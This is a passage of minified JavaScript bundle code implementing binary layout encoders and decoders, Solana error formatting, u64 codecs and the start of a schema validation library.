        return !0;
      }
      decode(t, n = 0) {
        e(t);
        const r = t.length - n;
        return Math.floor(r / this.elementSpan);
      }
      encode(t, e, n) {
        return 0;
      }
    }
    Cr.GreedyCount = s;
    class a extends i {
      constructor(t, e = 0, n) {
        if (!(t instanceof r)) throw new TypeError("layout must be a Layout");
        if (!Number.isInteger(e))
          throw new TypeError("offset must be integer or undefined");
        super(t.span, n || t.property), (this.layout = t), (this.offset = e);
      }
      isCount() {
        return this.layout instanceof u || this.layout instanceof c;
      }
      decode(t, e = 0) {
        return this.layout.decode(t, e + this.offset);
      }
      encode(t, e, n = 0) {
        return this.layout.encode(t, e, n + this.offset);
      }
    }
    Cr.OffsetLayout = a;
    class u extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readUIntLE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeUIntLE(t, r, this.span), this.span;
      }
    }
    Cr.UInt = u;
    class c extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readUIntBE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeUIntBE(t, r, this.span), this.span;
      }
    }
    Cr.UIntBE = c;
    class l extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readIntLE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeIntLE(t, r, this.span), this.span;
      }
    }
    Cr.Int = l;
    class d extends r {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e = 0) {
        return n(t).readIntBE(e, this.span);
      }
      encode(t, e, r = 0) {
        return n(e).writeIntBE(t, r, this.span), this.span;
      }
    }
    Cr.IntBE = d;
    const f = Math.pow(2, 32);
    function h(t) {
      const e = Math.floor(t / f);
      return { hi32: e, lo32: t - e * f };
    }
    function p(t, e) {
      return t * f + e;
    }
    class m extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t),
          o = r.readUInt32LE(e);
        return p(r.readUInt32LE(e + 4), o);
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32LE(o.lo32, r), i.writeUInt32LE(o.hi32, r + 4), 8;
      }
    }
    Cr.NearUInt64 = m;
    class g extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t);
        return p(r.readUInt32BE(e), r.readUInt32BE(e + 4));
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32BE(o.hi32, r), i.writeUInt32BE(o.lo32, r + 4), 8;
      }
    }
    Cr.NearUInt64BE = g;
    class y extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t),
          o = r.readUInt32LE(e);
        return p(r.readInt32LE(e + 4), o);
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeUInt32LE(o.lo32, r), i.writeInt32LE(o.hi32, r + 4), 8;
      }
    }
    Cr.NearInt64 = y;
    class w extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        const r = n(t);
        return p(r.readInt32BE(e), r.readUInt32BE(e + 4));
      }
      encode(t, e, r = 0) {
        const o = h(t),
          i = n(e);
        return i.writeInt32BE(o.hi32, r), i.writeUInt32BE(o.lo32, r + 4), 8;
      }
    }
    Cr.NearInt64BE = w;
    class b extends r {
      constructor(t) {
        super(4, t);
      }
      decode(t, e = 0) {
        return n(t).readFloatLE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeFloatLE(t, r), 4;
      }
    }
    Cr.Float = b;
    class v extends r {
      constructor(t) {
        super(4, t);
      }
      decode(t, e = 0) {
        return n(t).readFloatBE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeFloatBE(t, r), 4;
      }
    }
    Cr.FloatBE = v;
    class A extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        return n(t).readDoubleLE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeDoubleLE(t, r), 8;
      }
    }
    Cr.Double = A;
    class k extends r {
      constructor(t) {
        super(8, t);
      }
      decode(t, e = 0) {
        return n(t).readDoubleBE(e);
      }
      encode(t, e, r = 0) {
        return n(e).writeDoubleBE(t, r), 8;
      }
    }
    Cr.DoubleBE = k;
    class I extends r {
      constructor(t, e, n) {
        if (!(t instanceof r))
          throw new TypeError("elementLayout must be a Layout");
        if (
          !((e instanceof i && e.isCount()) || (Number.isInteger(e) && 0 <= e))
        )
          throw new TypeError(
            "count must be non-negative integer or an unsigned integer ExternalLayout"
          );
        let o = -1;
        !(e instanceof i) && 0 < t.span && (o = e * t.span),
          super(o, n),
          (this.elementLayout = t),
          (this.count = e);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0,
          r = this.count;
        if (
          (r instanceof i && (r = r.decode(t, e)), 0 < this.elementLayout.span)
        )
          n = r * this.elementLayout.span;
        else {
          let o = 0;
          for (; o < r; ) (n += this.elementLayout.getSpan(t, e + n)), ++o;
        }
        return n;
      }
      decode(t, e = 0) {
        const n = [];
        let r = 0,
          o = this.count;
        for (o instanceof i && (o = o.decode(t, e)); r < o; )
          n.push(this.elementLayout.decode(t, e)),
            (e += this.elementLayout.getSpan(t, e)),
            (r += 1);
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.elementLayout,
          o = t.reduce((t, o) => t + r.encode(o, e, n + t), 0);
        return this.count instanceof i && this.count.encode(t.length, e, n), o;
      }
    }
    Cr.Sequence = I;
    class S extends r {
      constructor(t, e, n) {
        if (!Array.isArray(t) || !t.reduce((t, e) => t && e instanceof r, !0))
          throw new TypeError("fields must be array of Layout instances");
        "boolean" == typeof e && void 0 === n && ((n = e), (e = void 0));
        for (const r of t)
          if (0 > r.span && void 0 === r.property)
            throw new Error(
              "fields cannot contain unnamed variable-length layout"
            );
        let o = -1;
        try {
          o = t.reduce((t, e) => t + e.getSpan(), 0);
        } catch (i) {}
        super(o, e), (this.fields = t), (this.decodePrefixes = !!n);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0;
        try {
          n = this.fields.reduce((n, r) => {
            const o = r.getSpan(t, e);
            return (e += o), n + o;
          }, 0);
        } catch (r) {
          throw new RangeError("indeterminate span");
        }
        return n;
      }
      decode(t, n = 0) {
        e(t);
        const r = this.makeDestinationObject();
        for (const e of this.fields)
          if (
            (void 0 !== e.property && (r[e.property] = e.decode(t, n)),
            (n += e.getSpan(t, n)),
            this.decodePrefixes && t.length === n)
          )
            break;
        return r;
      }
      encode(t, e, n = 0) {
        const r = n;
        let o = 0,
          i = 0;
        for (const s of this.fields) {
          let r = s.span;
          if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
            const o = t[s.property];
            void 0 !== o &&
              ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
          }
          (o = n), (n += r);
        }
        return o + i - r;
      }
      fromArray(t) {
        const e = this.makeDestinationObject();
        for (const n of this.fields)
          void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
        return e;
      }
      layoutFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
      offsetOf(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        let e = 0;
        for (const n of this.fields) {
          if (n.property === t) return e;
          0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
        }
      }
    }
    Cr.Structure = S;
    class _ {
      constructor(t) {
        this.property = t;
      }
      decode(t, e) {
        throw new Error("UnionDiscriminator is abstract");
      }
      encode(t, e, n) {
        throw new Error("UnionDiscriminator is abstract");
      }
    }
    Cr.UnionDiscriminator = _;
    class T extends _ {
      constructor(t, e) {
        if (!(t instanceof i && t.isCount()))
          throw new TypeError(
            "layout must be an unsigned integer ExternalLayout"
          );
        super(e || t.property || "variant"), (this.layout = t);
      }
      decode(t, e) {
        return this.layout.decode(t, e);
      }
      encode(t, e, n) {
        return this.layout.encode(t, e, n);
      }
    }
    Cr.UnionLayoutDiscriminator = T;
    class B extends r {
      constructor(t, e, n) {
        let o;
        if (t instanceof u || t instanceof c) o = new T(new a(t));
        else if (t instanceof i && t.isCount()) o = new T(t);
        else {
          if (!(t instanceof _))
            throw new TypeError(
              "discr must be a UnionDiscriminator or an unsigned integer layout"
            );
          o = t;
        }
        if ((void 0 === e && (e = null), !(null === e || e instanceof r)))
          throw new TypeError("defaultLayout must be null or a Layout");
        if (null !== e) {
          if (0 > e.span)
            throw new Error("defaultLayout must have constant span");
          void 0 === e.property && (e = e.replicate("content"));
        }
        let s = -1;
        e &&
          ((s = e.span),
          0 <= s && (t instanceof u || t instanceof c) && (s += o.layout.span)),
          super(s, n),
          (this.discriminator = o),
          (this.usesPrefixDiscriminator = t instanceof u || t instanceof c),
          (this.defaultLayout = e),
          (this.registry = {});
        let l = this.defaultGetSourceVariant.bind(this);
        (this.getSourceVariant = function (t) {
          return l(t);
        }),
          (this.configGetSourceVariant = function (t) {
            l = t.bind(this);
          });
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        const n = this.getVariant(t, e);
        if (!n)
          throw new Error("unable to determine span for unrecognized variant");
        return n.getSpan(t, e);
      }
      defaultGetSourceVariant(t) {
        if (
          Object.prototype.hasOwnProperty.call(t, this.discriminator.property)
        ) {
          if (
            this.defaultLayout &&
            this.defaultLayout.property &&
            Object.prototype.hasOwnProperty.call(t, this.defaultLayout.property)
          )
            return;
          const e = this.registry[t[this.discriminator.property]];
          if (
            e &&
            (!e.layout ||
              (e.property &&
                Object.prototype.hasOwnProperty.call(t, e.property)))
          )
            return e;
        } else
          for (const e in this.registry) {
            const n = this.registry[e];
            if (
              n.property &&
              Object.prototype.hasOwnProperty.call(t, n.property)
            )
              return n;
          }
        throw new Error("unable to infer src variant");
      }
      decode(t, e = 0) {
        let n;
        const r = this.discriminator,
          o = r.decode(t, e),
          i = this.registry[o];
        if (void 0 === i) {
          const i = this.defaultLayout;
          let s = 0;
          this.usesPrefixDiscriminator && (s = r.layout.span),
            (n = this.makeDestinationObject()),
            (n[r.property] = o),
            (n[i.property] = i.decode(t, e + s));
        } else n = i.decode(t, e);
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.getSourceVariant(t);
        if (void 0 === r) {
          const r = this.discriminator,
            o = this.defaultLayout;
          let i = 0;
          return (
            this.usesPrefixDiscriminator && (i = r.layout.span),
            r.encode(t[r.property], e, n),
            i + o.encode(t[o.property], e, n + i)
          );
        }
        return r.encode(t, e, n);
      }
      addVariant(t, e, n) {
        const r = new C(this, t, e, n);
        return (this.registry[t] = r), r;
      }
      getVariant(t, e = 0) {
        let n;
        return (
          (n = t instanceof Uint8Array ? this.discriminator.decode(t, e) : t),
          this.registry[n]
        );
      }
    }
    Cr.Union = B;
    class C extends r {
      constructor(t, e, n, o) {
        if (!(t instanceof B)) throw new TypeError("union must be a Union");
        if (!Number.isInteger(e) || 0 > e)
          throw new TypeError("variant must be a (non-negative) integer");
        if (
          ("string" == typeof n && void 0 === o && ((o = n), (n = null)), n)
        ) {
          if (!(n instanceof r)) throw new TypeError("layout must be a Layout");
          if (
            null !== t.defaultLayout &&
            0 <= n.span &&
            n.span > t.defaultLayout.span
          )
            throw new Error("variant span exceeds span of containing union");
          if ("string" != typeof o)
            throw new TypeError("variant must have a String property");
        }
        let i = t.span;
        0 > t.span &&
          ((i = n ? n.span : 0),
          0 <= i &&
            t.usesPrefixDiscriminator &&
            (i += t.discriminator.layout.span)),
          super(i, o),
          (this.union = t),
          (this.variant = e),
          (this.layout = n || null);
      }
      getSpan(t, e = 0) {
        if (0 <= this.span) return this.span;
        let n = 0;
        this.union.usesPrefixDiscriminator &&
          (n = this.union.discriminator.layout.span);
        let r = 0;
        return this.layout && (r = this.layout.getSpan(t, e + n)), n + r;
      }
      decode(t, e = 0) {
        const n = this.makeDestinationObject();
        if (this !== this.union.getVariant(t, e))
          throw new Error("variant mismatch");
        let r = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout
            ? (n[this.property] = this.layout.decode(t, e + r))
            : this.property
            ? (n[this.property] = !0)
            : this.union.usesPrefixDiscriminator &&
              (n[this.union.discriminator.property] = this.variant),
          n
        );
      }
      encode(t, e, n = 0) {
        let r = 0;
        if (
          (this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout &&
            !Object.prototype.hasOwnProperty.call(t, this.property))
        )
          throw new TypeError("variant lacks property " + this.property);
        this.union.discriminator.encode(this.variant, e, n);
        let o = r;
        if (
          this.layout &&
          (this.layout.encode(t[this.property], e, n + r),
          (o += this.layout.getSpan(e, n + r)),
          0 <= this.union.span && o > this.union.span)
        )
          throw new Error("encoded variant overruns containing union");
        return o;
      }
      fromArray(t) {
        if (this.layout) return this.layout.fromArray(t);
      }
    }
    function E(t) {
      return 0 > t && (t += 4294967296), t;
    }
    Cr.VariantLayout = C;
    class x extends r {
      constructor(t, e, n) {
        if (!(t instanceof u || t instanceof c))
          throw new TypeError("word must be a UInt or UIntBE layout");
        if (
          ("string" == typeof e && void 0 === n && ((n = e), (e = !1)),
          4 < t.span)
        )
          throw new RangeError("word cannot exceed 32 bits");
        super(t.span, n), (this.word = t), (this.msb = !!e), (this.fields = []);
        let r = 0;
        (this._packedSetValue = function (t) {
          return (r = E(t)), this;
        }),
          (this._packedGetValue = function () {
            return r;
          });
      }
      decode(t, e = 0) {
        const n = this.makeDestinationObject(),
          r = this.word.decode(t, e);
        this._packedSetValue(r);
        for (const o of this.fields)
          void 0 !== o.property && (n[o.property] = o.decode(t));
        return n;
      }
      encode(t, e, n = 0) {
        const r = this.word.decode(e, n);
        this._packedSetValue(r);
        for (const o of this.fields)
          if (void 0 !== o.property) {
            const e = t[o.property];
            void 0 !== e && o.encode(e);
          }
        return this.word.encode(this._packedGetValue(), e, n);
      }
      addField(t, e) {
        const n = new P(this, t, e);
        return this.fields.push(n), n;
      }
      addBoolean(t) {
        const e = new O(this, t);
        return this.fields.push(e), e;
      }
      fieldFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
    }
    Cr.BitStructure = x;
    class P {
      constructor(t, e, n) {
        if (!(t instanceof x))
          throw new TypeError("container must be a BitStructure");
        if (!Number.isInteger(e) || 0 >= e)
          throw new TypeError("bits must be positive integer");
        const r = 8 * t.span,
          o = t.fields.reduce((t, e) => t + e.bits, 0);
        if (e + o > r)
          throw new Error(
            "bits too long for span remainder (" +
              (r - o) +
              " of " +
              r +
              " remain)"
          );
        (this.container = t),
          (this.bits = e),
          (this.valueMask = (1 << e) - 1),
          32 === e && (this.valueMask = 4294967295),
          (this.start = o),
          this.container.msb && (this.start = r - o - e),
          (this.wordMask = E(this.valueMask << this.start)),
          (this.property = n);
      }
      decode(t, e) {
        return (
          E(this.container._packedGetValue() & this.wordMask) >>> this.start
        );
      }
      encode(t) {
        if (
          "number" != typeof t ||
          !Number.isInteger(t) ||
          t !== E(t & this.valueMask)
        )
          throw new TypeError(
            o("BitField.encode", this) +
              " value must be integer not exceeding " +
              this.valueMask
          );
        const e = this.container._packedGetValue(),
          n = E(t << this.start);
        this.container._packedSetValue(E(e & ~this.wordMask) | n);
      }
    }
    Cr.BitField = P;
    class O extends P {
      constructor(t, e) {
        super(t, 1, e);
      }
      decode(t, e) {
        return !!super.decode(t, e);
      }
      encode(t) {
        "boolean" == typeof t && (t = +t), super.encode(t);
      }
    }
    Cr.Boolean = O;
    class R extends r {
      constructor(t, e) {
        if (
          !((t instanceof i && t.isCount()) || (Number.isInteger(t) && 0 <= t))
        )
          throw new TypeError(
            "length must be positive integer or an unsigned integer ExternalLayout"
          );
        let n = -1;
        t instanceof i || (n = t), super(n, e), (this.length = t);
      }
      getSpan(t, e) {
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), n;
      }
      decode(t, e = 0) {
        let r = this.span;
        return 0 > r && (r = this.length.decode(t, e)), n(t).slice(e, e + r);
      }
      encode(t, e, r) {
        let s = this.length;
        if (
          (this.length instanceof i && (s = t.length),
          !(t instanceof Uint8Array && s === t.length))
        )
          throw new TypeError(
            o("Blob.encode", this) +
              " requires (length " +
              s +
              ") Uint8Array as src"
          );
        if (r + s > e.length)
          throw new RangeError("encoding overruns Uint8Array");
        const a = n(t);
        return (
          n(e).write(a.toString("hex"), r, s, "hex"),
          this.length instanceof i && this.length.encode(s, e, r),
          s
        );
      }
    }
    Cr.Blob = R;
    class M extends r {
      constructor(t) {
        super(-1, t);
      }
      getSpan(t, n = 0) {
        e(t);
        let r = n;
        for (; r < t.length && 0 !== t[r]; ) r += 1;
        return 1 + r - n;
      }
      decode(t, e = 0) {
        const r = this.getSpan(t, e);
        return n(t)
          .slice(e, e + r - 1)
          .toString("utf-8");
      }
      encode(e, r, o = 0) {
        "string" != typeof e && (e = String(e));
        const i = t.Buffer.from(e, "utf8"),
          s = i.length;
        if (o + s > r.length) throw new RangeError("encoding overruns Buffer");
        const a = n(r);
        return i.copy(a, o), (a[o + s] = 0), s + 1;
      }
    }
    Cr.CString = M;
    class L extends r {
      constructor(t, e) {
        if (
          ("string" == typeof t && void 0 === e && ((e = t), (t = void 0)),
          void 0 === t)
        )
          t = -1;
        else if (!Number.isInteger(t))
          throw new TypeError("maxSpan must be an integer");
        super(-1, e), (this.maxSpan = t);
      }
      getSpan(t, n = 0) {
        return e(t), t.length - n;
      }
      decode(t, e = 0) {
        const r = this.getSpan(t, e);
        if (0 <= this.maxSpan && this.maxSpan < r)
          throw new RangeError("text length exceeds maxSpan");
        return n(t)
          .slice(e, e + r)
          .toString("utf-8");
      }
      encode(e, r, o = 0) {
        "string" != typeof e && (e = String(e));
        const i = t.Buffer.from(e, "utf8"),
          s = i.length;
        if (0 <= this.maxSpan && this.maxSpan < s)
          throw new RangeError("text length exceeds maxSpan");
        if (o + s > r.length) throw new RangeError("encoding overruns Buffer");
        return i.copy(n(r), o), s;
      }
    }
    Cr.UTF8 = L;
    class N extends r {
      constructor(t, e) {
        super(0, e), (this.value = t);
      }
      decode(t, e) {
        return this.value;
      }
      encode(t, e, n) {
        return 0;
      }
    }
    return (
      (Cr.Constant = N),
      (Cr.greedy = (t, e) => new s(t, e)),
      (Cr.offset = (t, e, n) => new a(t, e, n)),
      (Cr.u8 = (t) => new u(1, t)),
      (Cr.u16 = (t) => new u(2, t)),
      (Cr.u24 = (t) => new u(3, t)),
      (Cr.u32 = (t) => new u(4, t)),
      (Cr.u40 = (t) => new u(5, t)),
      (Cr.u48 = (t) => new u(6, t)),
      (Cr.nu64 = (t) => new m(t)),
      (Cr.u16be = (t) => new c(2, t)),
      (Cr.u24be = (t) => new c(3, t)),
      (Cr.u32be = (t) => new c(4, t)),
      (Cr.u40be = (t) => new c(5, t)),
      (Cr.u48be = (t) => new c(6, t)),
      (Cr.nu64be = (t) => new g(t)),
      (Cr.s8 = (t) => new l(1, t)),
      (Cr.s16 = (t) => new l(2, t)),
      (Cr.s24 = (t) => new l(3, t)),
      (Cr.s32 = (t) => new l(4, t)),
      (Cr.s40 = (t) => new l(5, t)),
      (Cr.s48 = (t) => new l(6, t)),
      (Cr.ns64 = (t) => new y(t)),
      (Cr.s16be = (t) => new d(2, t)),
      (Cr.s24be = (t) => new d(3, t)),
      (Cr.s32be = (t) => new d(4, t)),
      (Cr.s40be = (t) => new d(5, t)),
      (Cr.s48be = (t) => new d(6, t)),
      (Cr.ns64be = (t) => new w(t)),
      (Cr.f32 = (t) => new b(t)),
      (Cr.f32be = (t) => new v(t)),
      (Cr.f64 = (t) => new A(t)),
      (Cr.f64be = (t) => new k(t)),
      (Cr.struct = (t, e, n) => new S(t, e, n)),
      (Cr.bits = (t, e, n) => new x(t, e, n)),
      (Cr.seq = (t, e, n) => new I(t, e, n)),
      (Cr.union = (t, e, n) => new B(t, e, n)),
      (Cr.unionLayoutDiscriminator = (t, e) => new T(t, e)),
      (Cr.blob = (t, e) => new R(t, e)),
      (Cr.cstr = (t) => new M(t)),
      (Cr.utf8 = (t, e) => new L(t, e)),
      (Cr.constant = (t, e) => new N(t, e)),
      Cr
    );
  })();
  function xr(t) {
    if (Array.isArray(t)) {
      return "%5B" + t.map(xr).join("%2C%20") + "%5D";
    }
    return "bigint" == typeof t
      ? `${t}n`
      : encodeURIComponent(
          String(null != t && null === Object.getPrototypeOf(t) ? { ...t } : t)
        );
  }
  function Pr([t, e]) {
    return `${t}=${xr(e)}`;
  }
  function Or(t, e = {}) {
    {
      let n = `Solana error #${t}; Decode this error by running \`npx @solana/errors decode -- ${t}`;
      return (
        Object.keys(e).length &&
          (n += ` '${(function (t) {
            const e = Object.entries(t).map(Pr).join("&");
            return btoa(e);
          })(e)}'`),
        `${n}\``
      );
    }
  }
  var Rr = class extends Error {
    constructor(...[t, n]) {
      let r, o;
      if (n) {
        const { cause: t, ...e } = n;
        t && (o = { cause: t }), Object.keys(e).length > 0 && (r = e);
      }
      super(Or(t, r), o),
        e(this, "cause", this.cause),
        e(this, "context"),
        (this.context = { __code: t, ...r }),
        (this.name = "SolanaError");
    }
  };
  function Mr(t) {
    return "fixedSize" in t && "number" == typeof t.fixedSize;
  }
  function Lr(t) {
    return 1 !== (null == t ? void 0 : t.endian);
  }
  function Nr(t) {
    return (
      (e = {
        fixedSize: t.size,
        write(e, n, r) {
          t.range &&
            !(function (t, e, n, r) {
              if (r < e || r > n)
                throw new Rr(8078011, {
                  codecDescription: t,
                  max: n,
                  min: e,
                  value: r,
                });
            })(t.name, t.range[0], t.range[1], e);
          const o = new ArrayBuffer(t.size);
          return (
            t.set(new DataView(o), e, Lr(t.config)),
            n.set(new Uint8Array(o), r),
            r + t.size
          );
        },
      }),
      Object.freeze({
        ...e,
        encode: (t) => {
          const n = new Uint8Array(
            (function (t, e) {
              return "fixedSize" in e ? e.fixedSize : e.getSizeFromValue(t);
            })(t, e)
          );
          return e.write(t, n, 0), n;
        },
      })
    );
    var e;
  }
  function Dr(t) {
    return (
      (e = {
        fixedSize: t.size,
        read(e, n = 0) {
          !(function (t, e, n = 0) {
            if (e.length - n <= 0)
              throw new Rr(8078e3, { codecDescription: t });
          })(t.name, e, n),
            (function (t, e, n, r = 0) {
              const o = n.length - r;
              if (o < e)
                throw new Rr(8078001, {
                  bytesLength: o,
                  codecDescription: t,
                  expected: e,
                });
            })(t.name, t.size, e, n);
          const r = new DataView(
            (function (t, e, n) {
              const r = t.byteOffset + (e ?? 0),
                o = n ?? t.byteLength;
              return t.buffer.slice(r, r + o);
            })(e, n, t.size)
          );
          return [t.get(r, Lr(t.config)), n + t.size];
        },
      }),
      Object.freeze({ ...e, decode: (t, n = 0) => e.read(t, n)[0] })
    );
    var e;
  }
  var Ur = (t = {}) =>
      Nr({
        config: t,
        name: "u64",
        range: [0n, BigInt("0xffffffffffffffff")],
        set: (t, e, n) => t.setBigUint64(0, BigInt(e), n),
        size: 8,
      }),
    qr = (t = {}) =>
      (function (t, e) {
        if (Mr(t) !== Mr(e)) throw new Rr(8078004);
        if (Mr(t) && Mr(e) && t.fixedSize !== e.fixedSize)
          throw new Rr(8078005, {
            decoderFixedSize: e.fixedSize,
            encoderFixedSize: t.fixedSize,
          });
        if (!Mr(t) && !Mr(e) && t.maxSize !== e.maxSize)
          throw new Rr(8078006, {
            decoderMaxSize: e.maxSize,
            encoderMaxSize: t.maxSize,
          });
        return {
          ...e,
          ...t,
          decode: e.decode,
          encode: t.encode,
          read: e.read,
          write: t.write,
        };
      })(
        Ur(t),
        ((t = {}) =>
          Dr({
            config: t,
            get: (t, e) => t.getBigUint64(0, e),
            name: "u64",
            size: 8,
          }))(t)
      );
  let zr = class extends TypeError {
    constructor(t, e) {
      let n;
      const { message: r, explanation: o, ...i } = t,
        { path: s } = t,
        a = 0 === s.length ? r : `At path: ${s.join(".")} -- ${r}`;
      super(o ?? a),
        null != o && (this.cause = a),
        Object.assign(this, i),
        (this.name = this.constructor.name),
        (this.failures = () => n ?? (n = [t, ...e()]));
    }
  };
  function Kr(t) {
    return "object" == typeof t && null != t;
  }
  function Wr(t) {
    return Kr(t) && !Array.isArray(t);
  }
  function Fr(t) {
    return "symbol" == typeof t
      ? t.toString()
      : "string" == typeof t
      ? JSON.stringify(t)
      : `${t}`;
  }
  function jr(t, e, n, r) {
    if (!0 === t) return;
    !1 === t ? (t = {}) : "string" == typeof t && (t = { message: t });
    const { path: o, branch: i } = e,
      { type: s } = n,
      {
        refinement: a,
        message: u = `Expected a value of type \`${s}\`${
          a ? ` with refinement \`${a}\`` : ""
        }, but received: \`${Fr(r)}\``,
      } = t;
    return {
      value: r,
      type: s,
      refinement: a,
      key: o[o.length - 1],
      path: o,
      branch: i,
      ...t,
      message: u,
    };
  }
  function* Gr(t, e, n, r) {
    var o;
    (Kr((o = t)) && "function" == typeof o[Symbol.iterator]) || (t = [t]);
    for (const i of t) {
      const t = jr(i, e, n, r);
      t && (yield t);
    }
  }
  function* Vr(t, e, n = {}) {
    const { path: r = [], branch: o = [t], coerce: i = !1, mask: s = !1 } = n,
      a = { path: r, branch: o, mask: s };
    i && (t = e.coercer(t, a));
    let u = "valid";
    for (const c of e.validator(t, a))
      (c.explanation = n.message), (u = "not_valid"), yield [c, void 0];
    for (let [c, l, d] of e.entries(t, a)) {
      const e = Vr(l, d, {
        path: void 0 === c ? r : [...r, c],
        branch: void 0 === c ? o : [...o, l],
        coerce: i,
        mask: s,
        message: n.message,
      });
      for (const n of e)
        n[0]
          ? ((u = null != n[0].refinement ? "not_refined" : "not_valid"),
            yield [n[0], void 0])
          : i &&
            ((l = n[1]),
            void 0 === c
              ? (t = l)
              : t instanceof Map
              ? t.set(c, l)
              : t instanceof Set
              ? t.add(l)
              : Kr(t) && (void 0 !== l || c in t) && (t[c] = l));
    }
    if ("not_valid" !== u)
      for (const c of e.refiner(t, a))
        (c.explanation = n.message), (u = "not_refined"), yield [c, void 0];
    "valid" === u && (yield [void 0, t]);
  }
  let Hr = class {
    constructor(t) {
      const {
        type: e,
        schema: n,
        validator: r,
        refiner: o,
        coercer: i = (t) => t,
        entries: s = function* () {},
      } = t;
      (this.type = e),
        (this.schema = n),
        (this.entries = s),
        (this.coercer = i),
        (this.validator = r ? (t, e) => Gr(r(t, e), e, this, t) : () => []),
        (this.refiner = o ? (t, e) => Gr(o(t, e), e, this, t) : () => []);
    }
    assert(t, e) {
      return Zr(t, this, e);
    }
    create(t, e) {
      return Xr(t, this, e);
    }
    is(t) {
      return Jr(t, this);
    }
    mask(t, e) {
      return (function (t, e, n) {
        const r = Yr(t, e, { coerce: !0, mask: !0, message: n });
        if (r[0]) throw r[0];
        return r[1];
      })(t, this, e);
    }
    validate(t, e = {}) {
      return Yr(t, this, e);
    }
  };
  function Zr(t, e, n) {
    const r = Yr(t, e, { message: n });
    if (r[0]) throw r[0];
  }
  function Xr(t, e, n) {
    const r = Yr(t, e, { coerce: !0, message: n });
    if (r[0]) throw r[0];
    return r[1];
  }
  function Jr(t, e) {
    return !Yr(t, e)[0];
  }
  function Yr(t, e, n = {}) {
    const r = Vr(t, e, n),
      o = (function (t) {
        const { done: e, value: n } = t.next();
        return e ? void 0 : n;
      })(r);
    if (o[0]) {
      return [
        new zr(o[0], function* () {
          for (const t of r) t[0] && (yield t[0]);
        }),
        void 0,
      ];
    }
    return [void 0, o[1]];
  }
  function Qr(t, e) {
    return new Hr({ type: t, schema: null, validator: e });
  }
  function $r(t) {
    return new Hr({
      type: "array",
      schema: t,
      *entries(e) {
        if (t && Array.isArray(e))
          for (const [n, r] of e.entries()) yield [n, r, t];
      },
      coercer: (t) => (Array.isArray(t) ? t.slice() : t),
      validator: (t) =>
        Array.isArray(t) || `Expected an array value, but received: ${Fr(t)}`,
    });
  }
  function to() {
    return Qr("boolean", (t) => "boolean" == typeof t);
  }
  function eo(t) {
    return Qr(
      "instance",
      (e) =>
        e instanceof t ||
        `Expected a \`${t.name}\` instance, but received: ${Fr(e)}`
    );
  }
  function no(t) {
    const e = Fr(t),
      n = typeof t;
    return new Hr({
      type: "literal",
      schema: "string" === n || "number" === n || "boolean" === n ? t : null,
      validator: (n) =>
        n === t || `Expected the literal \`${e}\`, but received: ${Fr(n)}`,
    });
  }
  function ro(t) {
    return new Hr({
      ...t,
      validator: (e, n) => null === e || t.validator(e, n),
      refiner: (e, n) => null === e || t.refiner(e, n),
    });
  }
  function oo() {
    return Qr(
      "number",
      (t) =>
        ("number" == typeof t && !isNaN(t)) ||
        `Expected a number, but received: ${Fr(t)}`
    );
  }
  function io(t) {
    return new Hr({
      ...t,
      validator: (e, n) => void 0 === e || t.validator(e, n),
      refiner: (e, n) => void 0 === e || t.refiner(e, n),
    });
  }
  function so(t, e) {
    return new Hr({
      type: "record",
      schema: null,
      *entries(n) {
        if (Kr(n))
          for (const r in n) {
            const o = n[r];
            yield [r, r, t], yield [r, o, e];
          }
      },
      validator: (t) => Wr(t) || `Expected an object, but received: ${Fr(t)}`,
      coercer: (t) => (Wr(t) ? { ...t } : t),
    });
  }
  function ao() {
    return Qr(
      "string",
      (t) => "string" == typeof t || `Expected a string, but received: ${Fr(t)}`
    );
  }
  function uo(t) {
    const e = Qr("never", () => !1);
    return new Hr({
      type: "tuple",
      schema: null,
      *entries(n) {
        if (Array.isArray(n)) {
          const r = Math.max(t.length, n.length);
          for (let o = 0; o < r; o++) yield [o, n[o], t[o] || e];
        }
      },
      validator: (t) =>
